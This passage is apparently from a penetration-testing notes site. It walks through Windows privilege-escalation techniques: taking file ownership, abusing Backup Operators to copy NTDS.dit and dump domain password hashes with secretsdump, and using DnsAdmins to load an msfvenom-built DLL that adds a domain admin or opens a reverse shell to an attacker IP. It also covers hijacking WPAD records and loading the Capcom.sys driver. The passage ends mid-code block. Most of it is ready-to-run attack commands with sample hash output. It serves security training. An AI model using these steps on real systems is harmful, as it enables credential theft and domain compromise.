         </span><span class="o">*</span><span class="w"> </span><span class="n">NTLM</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">cf3a5525ee9414229e66279623ed5c58</span><span class="w">
         </span><span class="o">*</span><span class="w"> </span><span class="n">SHA1</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">3c7374127c9a60f9e5b28d3a343eb7ac972367b2</span><span class="w">
</span><span class="err">&lt;</span><span class="n">SNIP</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><h3 id="setakeownershipprivilege"><span class="mr-2">SeTakeOwnershipPrivilege</span><a href="#setakeownershipprivilege" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The <code class="language-plaintext highlighter-rouge">SeTakeOwnershipPrivilege</code> policy setting determines which users can take ownership of any securable object in the device, including Active Directory objects, NTFS files and folders, printers, registry keys, services, processes, and threads.</p><p>First we can check who has the ownership of the file we are targeting :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'C:\Users\bob\Desktop\Secret_Data.txt'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="nx">directory</span><span class="p">,</span><span class="w"> </span><span class="p">@{</span><span class="nx">Name</span><span class="o">=</span><span class="s2">"Owner"</span><span class="p">;</span><span class="nx">Expression</span><span class="o">=</span><span class="p">{(</span><span class="n">Get-ACL</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Fullname</span><span class="p">)</span><span class="o">.</span><span class="nf">Owner</span><span class="p">}}</span><span class="w">
</span></pre></table></code></div></div><p>If there is no name on the <code class="language-plaintext highlighter-rouge">Owner</code> section, you can look a the owner of the directory where the file is located with the <code class="language-plaintext highlighter-rouge">dir /q</code> command. Now we can take the ownership :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">takeown</span><span class="w"> </span><span class="nx">/f</span><span class="w"> </span><span class="s1">'C:\Department Shares\Private\IT\cred.txt'</span><span class="w">
</span></pre></table></code></div></div><p>If we still can’t read the file, we can use the <code class="language-plaintext highlighter-rouge">icacls</code> command to change its Access Control Lists (ACL) :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">icacls</span><span class="w"> </span><span class="s1">'C:\Users\bob\Desktop\Secret_Data.txt'</span><span class="w"> </span><span class="nx">/grant</span><span class="w"> </span><span class="nx">OUR_USER:F</span><span class="w">
</span></pre></table></code></div></div><p>This command will grant us full access (<code class="language-plaintext highlighter-rouge">F</code>) to the file.</p><hr /><h2 id="exploit-groups-permissions"><span class="mr-2">Exploit Groups Permissions</span><a href="#exploit-groups-permissions" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Just like the user privileges, groups allow you to do things that a normal user may not be able to do. To see in which group we are in you can use the command <code class="language-plaintext highlighter-rouge">whoami /groups</code>.</p><h3 id="backup-operators"><span class="mr-2">Backup Operators</span><a href="#backup-operators" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>When member of this group, we are granted the <code class="language-plaintext highlighter-rouge">SeBackup</code> and <code class="language-plaintext highlighter-rouge">SeRestore</code> rights. <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code> allows file content retrieval, even if the security descriptor on the file might not grant such access. A caller with <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code> enabled obviates the need for any ACL-based security check.</p><p>Because we can’t use the standard <code class="language-plaintext highlighter-rouge">copy</code> command, we can use a program to copy files or just use the following <a href="https://github.com/giuliano108/SeBackupPrivilege">PoC</a>. As the Github states, we need to import the two <code class="language-plaintext highlighter-rouge">dll</code> in <code class="language-plaintext highlighter-rouge">Powershell</code> :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\SeBackupPrivilegeUtils.dll</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\SeBackupPrivilegeCmdLets.dll</span><span class="w">
</span></pre></table></code></div></div><p>To check if the <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code> is enabled, we can use either the <code class="language-plaintext highlighter-rouge">whoami /priv</code> or the <code class="language-plaintext highlighter-rouge">PS &gt; Get-SeBackupPrivilege</code> command. If the privilege isn’t enabled, we can use the following command to enable it :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Set-SeBackupPrivilege</span><span class="w">
</span></pre></table></code></div></div><p>Imagine that we can’t read the content of the <code class="language-plaintext highlighter-rouge">Secret_Data.txt</code> on the bob desktop. We can use this command to copy it to a location where we have read rights.</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Copy-FileSeBackupPrivilege</span><span class="w"> </span><span class="s1">'C:\Users\bob\Desktop\Secret_Data.txt'</span><span class="w"> </span><span class="o">.</span><span class="nx">\Secret_Data.txt</span><span class="w">
</span></pre></table></code></div></div><h4 id="attacking-domain-controler-ntdsdit"><span class="mr-2">Attacking Domain Controler (NTDS.dit)</span><a href="#attacking-domain-controler-ntdsdit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>This group also permits local domain controller logins. Given that it stores the NTLM hashes for all user and computer objects in the domain, the active directory database <code class="language-plaintext highlighter-rouge">NTDS.dit</code> makes for an extremely appealing target. However, unprivileged users cannot access this file since it is locked.</p><p>The <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow">diskshadow</a> command allows us to create a shadow copy of the <code class="language-plaintext highlighter-rouge">C:</code> drive.</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">diskshadow.exe</span><span class="w">
</span><span class="n">DISKSHADOW</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">verbose</span><span class="w"> </span><span class="nx">on</span><span class="w">
</span><span class="n">DISKSHADOW</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">metadata</span><span class="w"> </span><span class="nx">C:\Windows\Temp\meta.cab</span><span class="w">
</span><span class="n">DISKSHADOW</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">context</span><span class="w"> </span><span class="nx">clientaccessible</span><span class="w">
</span><span class="n">DISKSHADOW</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">context</span><span class="w"> </span><span class="nx">persistent</span><span class="w">
</span><span class="n">DISKSHADOW</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">begin</span><span class="w"> </span><span class="nx">backup</span><span class="w">
</span><span class="n">DISKSHADOW</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">volume</span><span class="w"> </span><span class="nx">C:</span><span class="w"> </span><span class="nx">alias</span><span class="w"> </span><span class="nx">cdrive</span><span class="w">
</span><span class="n">DISKSHADOW</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">create</span><span class="w">
</span><span class="n">DISKSHADOW</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">expose</span><span class="w"> </span><span class="o">%</span><span class="nx">cdrive</span><span class="o">%</span><span class="w"> </span><span class="nx">E:</span><span class="w">
</span><span class="n">DISKSHADOW</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">end</span><span class="w"> </span><span class="nx">backup</span><span class="w">
</span><span class="n">DISKSHADOW</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">exit</span><span class="w">
</span></pre></table></code></div></div><p>Now if you try to list the directories of the <code class="language-plaintext highlighter-rouge">E:</code> drive, you will see the same tree structure as in the <code class="language-plaintext highlighter-rouge">C:</code> drive. The <code class="language-plaintext highlighter-rouge">Copy-FileSeBackupPrivilege</code> cmdlet allows us to bypass ACL and copy the NTDS.dit wherever we want :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Copy-FileSeBackupPrivilege</span><span class="w"> </span><span class="nx">E:\Windows\NTDS\ntds.dit</span><span class="w"> </span><span class="nx">C:\Users\Public\Downloads\ntds.dit</span><span class="w">
</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>You also use tools to extract the <code class="language-plaintext highlighter-rouge">ntds.dit</code> file like robocopy : <code class="language-plaintext highlighter-rouge">robocopy /B E:\Windows\NTDS .\ntds ntds.dit</code></p></div></blockquote><p>We can now export <code class="language-plaintext highlighter-rouge">SAM</code> and <code class="language-plaintext highlighter-rouge">SYSTEM</code> registery hives and try to crack local user passwords. First we need to export these hives :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">reg</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">HKLM\SYSTEM</span><span class="w"> </span><span class="nx">SYSTEM.SAV</span><span class="w">
</span></pre></table></code></div></div><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">reg</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">HKLM\SAM</span><span class="w"> </span><span class="nx">SAM.SAV</span><span class="w">
</span></pre></table></code></div></div><p>Now that we have the <code class="language-plaintext highlighter-rouge">SAM</code> and <code class="language-plaintext highlighter-rouge">SYSTEM</code> registery hives, we can extract all AD account credentials using tools such as <code class="language-plaintext highlighter-rouge">secretsdump.py</code> or the PowerShell <a href="https://github.com/MichaelGrafnetter/DSInternals/blob/master/Src/DSInternals.PowerShell/DSInternals.psd1">DSInternals</a> :</p><ol><li><strong>DSInternals</strong></ol><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\DSInternals.psd1</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-BootKey</span><span class="w"> </span><span class="nt">-SystemHivePath</span><span class="w"> </span><span class="o">.</span><span class="nx">\SYSTEM</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ADDBAccount</span><span class="w"> </span><span class="nt">-DistinguishedName</span><span class="w"> </span><span class="s1">'CN=administrator,CN=users,DC=inlanefreight,DC=local'</span><span class="w"> </span><span class="nt">-DBPath</span><span class="w"> </span><span class="o">.</span><span class="nx">\ntds.dit</span><span class="w"> </span><span class="nt">-BootKey</span><span class="w"> </span><span class="nv">$key</span><span class="w">
</span><span class="err">&lt;</span><span class="n">CREDS</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><ol><li><strong>Secretsdump</strong></ol><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>secretsdump.py <span class="nt">-ntds</span> ntds.dit <span class="nt">-system</span> SYSTEM <span class="nt">-hashes</span> lmhash:nthash LOCAL

Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Searching <span class="k">for </span>pekList, be patient
<span class="o">[</span><span class="k">*</span><span class="o">]</span> PEK <span class="c"># 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Bob:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
&lt;SNIP&gt;
</pre></table></code></div></div><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">secretsdump.py</code> is part of the <a href="https://www.kali.org/tools/impacket/">Impaket</a> collection. If you already have <code class="language-plaintext highlighter-rouge">Impaket</code><code class="language-plaintext highlighter-rouge">installed on your computer you already have the </code><code class="language-plaintext highlighter-rouge">secretsdump.py</code><code class="language-plaintext highlighter-rouge"> too. You can use </code><code class="language-plaintext highlighter-rouge">locate secretsdump.py</code>` to locate it.</p></div></blockquote><blockquote class="prompt-tip"><div><p>You can use this output for a <a href="https://nouman404.github.io/Notes/Footprinting/Common_Services_Enumeration_&amp;_Attacks#rdp-pass-the-hash-pth">pass the hash</a> attack or try to crack it with <a href="https://nouman404.github.io/Notes/Brute_Force/Password_Cracking#hashcat">Hashcat</a>.</p></div></blockquote><h3 id="event-log-readers"><span class="mr-2">Event Log Readers</span><a href="#event-log-readers" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Members of this group can read event logs from local computers. The group is created when the server is promoted to a domain controller. You can try finding commands ran with credentials using either the CMD or Powershell :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">wevtutil</span><span class="w"> </span><span class="nx">qe</span><span class="w"> </span><span class="nx">Security</span><span class="w"> </span><span class="nx">/rd:true</span><span class="w"> </span><span class="nx">/f:text</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"/user"</span><span class="w">
</span></pre></table></code></div></div><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">wevtutil</span><span class="w"> </span><span class="nx">qe</span><span class="w"> </span><span class="nx">Security</span><span class="w"> </span><span class="nx">/rd:true</span><span class="w"> </span><span class="nx">/f:text</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-String</span><span class="w"> </span><span class="s2">"/user"</span><span class="w">
</span></pre></table></code></div></div><p>or</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-WinEvent</span><span class="w"> </span><span class="nt">-LogName</span><span class="w"> </span><span class="nx">security</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">where</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">ID</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="mi">4688</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="n">Properties</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="nf">Value</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s1">'*/user*'</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="p">@{</span><span class="nx">name</span><span class="o">=</span><span class="s1">'CommandLine'</span><span class="p">;</span><span class="nx">expression</span><span class="o">=</span><span class="p">{</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="n">Properties</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="nf">Value</span><span class="w"> </span><span class="p">}}</span><span class="w">
</span></pre></table></code></div></div><h3 id="dnsadmins"><span class="mr-2">DnsAdmins</span><a href="#dnsadmins" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Members of <code class="language-plaintext highlighter-rouge">DnsAdmins</code> group have access to network DNS information. The default permissions are as follows: Allow: Read, Write, Create All Child objects, Delete Child objects, Special Permissions. This group exists only if the DNS server role is or was once installed on a domain controller in the domain. Membership in this group may be used to increase privileges on a Domain Controller or in cases where a different server is serving as the domain’s DNS server because the DNS service is run as <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code>.</p><h4 id="leveraging-dnsadmins-access"><span class="mr-2">Leveraging DnsAdmins Access</span><a href="#leveraging-dnsadmins-access" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>First we will create a malicious dll file to add your user to the <code class="language-plaintext highlighter-rouge">domain admins</code> or to create a reverse shell on our attacker Linux machine :</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>msfvenom <span class="nt">-p</span> windows/x64/exec <span class="nv">cmd</span><span class="o">=</span><span class="s1">'net group "domain admins" USER /add /domain'</span> <span class="nt">-f</span> dll <span class="nt">-o</span> adduser.dll
</pre></table></code></div></div><p>or</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>msfvenom <span class="nt">-p</span> windows/shell/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>YOUR_IP <span class="nv">LPORT</span><span class="o">=</span>YOUR_PORT <span class="nt">-f</span> dll <span class="nt">-o</span> shell-cmd.dll
</pre></table></code></div></div><p>Now that our <code class="language-plaintext highlighter-rouge">.dll</code> malicious file is created you can upload it to the Windows machines using the method of your choice (HTTP, SMB, FTP server…). If you start a HTTP server you can download the file on windows using the following command :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">wget</span><span class="w"> </span><span class="s2">"http://IP:PORT/YOUR_MALICIOUS_FILE.dll"</span><span class="w"> </span><span class="nt">-outfile</span><span class="w"> </span><span class="s2">"YOUR_MALICIOUS_FILE.dll"</span><span class="w">
</span></pre></table></code></div></div><p>If you are not a member of the <code class="language-plaintext highlighter-rouge">DnsAdmins</code> group you may get an error when trying to execute your malicious dll.</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">dnscmd.exe</span><span class="w"> </span><span class="nx">/config</span><span class="w"> </span><span class="nx">/serverlevelplugindll</span><span class="w"> </span><span class="nx">C:\Users\Public\Downloads\YOUR_MALICIOUS_FILE.dll</span><span class="w">
</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>You can check if you are a member of the <code class="language-plaintext highlighter-rouge">DnsAdmins</code> group with the command : <code class="language-plaintext highlighter-rouge">Get-ADGroupMember -Identity DnsAdmins</code>.</p></div></blockquote><blockquote class="prompt-warning"><div><p>We must specify the full path to our malicious DLL or the attack will not work properly.</p></div></blockquote><p>To receive our reverse shell or to add our user to a certain group we need to stop the DNS service and start it back :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">sc</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="nx">dns</span><span class="w">
</span></pre></table></code></div></div><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">sc</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">dns</span><span class="w">
</span></pre></table></code></div></div><p>You can also use the <code class="language-plaintext highlighter-rouge">mimilib.dll</code> (by the creator of Mimikatz) explained in <a href="http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html">this blog</a> to abuse the <code class="language-plaintext highlighter-rouge">dns admin group</code> privileges.</p><h3 id="creating-a-wpad-record"><span class="mr-2">Creating a WPAD Record</span><a href="#creating-a-wpad-record" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Clients can utilize the Web Proxy Auto-Discovery (WPAD) Protocol to find the URL of a configuration file using DHCP and/or DNS discovery techniques. The configuration file can be invoked to find the proxy for a given URL after detection and download are finished.</p><p>For this attack to work, we first need to disable the Global Query Block List :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Set-DnsServerGlobalQueryBlockList</span><span class="w"> </span><span class="nt">-Enable</span><span class="w"> </span><span class="bp">$false</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dc01.DOMAIN_NAME.local</span><span class="w">
</span></pre></table></code></div></div><p>We can now add our attacker machine to the WPAD Records :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Add-DnsServerResourceRecordA</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">wpad</span><span class="w"> </span><span class="nt">-ZoneName</span><span class="w"> </span><span class="nx">DOMAIN.local</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dc01.DOMAIN.local</span><span class="w"> </span><span class="nt">-IPv4Address</span><span class="w"> </span><span class="nx">OUR_ATTACKER_IP</span><span class="w">
</span></pre></table></code></div></div><h3 id="print-operators"><span class="mr-2">Print Operators</span><a href="#print-operators" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Members of this group can manage, create, share, and delete printers that are connected to domain controllers in the domain. They can also manage Active Directory printer objects in the domain. Members of this group can locally sign in to and shut down domain controllers in the domain. This grant their user the <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code> privilege.</p><p>First we can use the <a href="https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp">EnableSeLoadDriverPrivilege</a> tool to enable the privilege and load the driver. You can add the following includes at the begining of the file :</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;assert.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;winternl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sddl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"tchar.h"</span><span class="cp">
</span></pre></table></code></div></div><p>You can compile the <code class="language-plaintext highlighter-rouge">.cpp</code> file in Visual Studio using the following command : <code class="language-plaintext highlighter-rouge">cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp</code>. Now you have to upload this <a href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys">Capcom.sys</a> file and add a reference to this driver under our HKEY_CURRENT_USER tree :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
